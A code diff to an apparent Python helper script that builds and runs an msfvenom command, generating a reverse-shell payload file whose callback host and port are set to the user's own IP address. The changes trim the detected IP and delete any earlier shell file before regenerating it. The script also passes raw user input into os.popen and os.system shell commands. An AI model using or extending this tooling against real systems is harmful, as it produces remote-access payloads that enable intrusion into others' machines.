@@ -14,7 +14,8 @@ print("")
 ip_choice = input("[++] Please choice which adapter you are using. ")
 print("")
 print("Your IP address is...")
-ip = os.popen("ifconfig {adp} | grep 'inet ' | cut -d ' ' -f 10".format(adp=ip_choice)).read()
+ip1 = os.popen("ifconfig {adp} | grep 'inet ' | cut -d ' ' -f 10".format(adp=ip_choice)).read()
+ip = ip1.rstrip()
 print(ip)
 
 
@@ -119,18 +120,15 @@ else:
     sys.exit()
 print("")
 
+del_file = "shell.{file}".format(file=file_type)
+if os.path.isfile(del_file):
+    os.system("rm -r {file}".format(file=del_file))
+
+
 print("Payload ready")
-msf_command = "msfvenom -p {payload} LHOST={ip} LPORT={port} -f {file} > shell.{file}".format(payload=payload, ip=ip, port=port, file=file_type)
+msf_command = "msfvenom -p {payload} LHOST={ip} LPORT={port} -f {file} > shell.{file}".format(payload=payload,ip=ip,port=port,file=file_type)
 print(msf_command)
 print("")
 
 
 os.system(msf_command)
-
-
-
-
-
-
-
-# Space
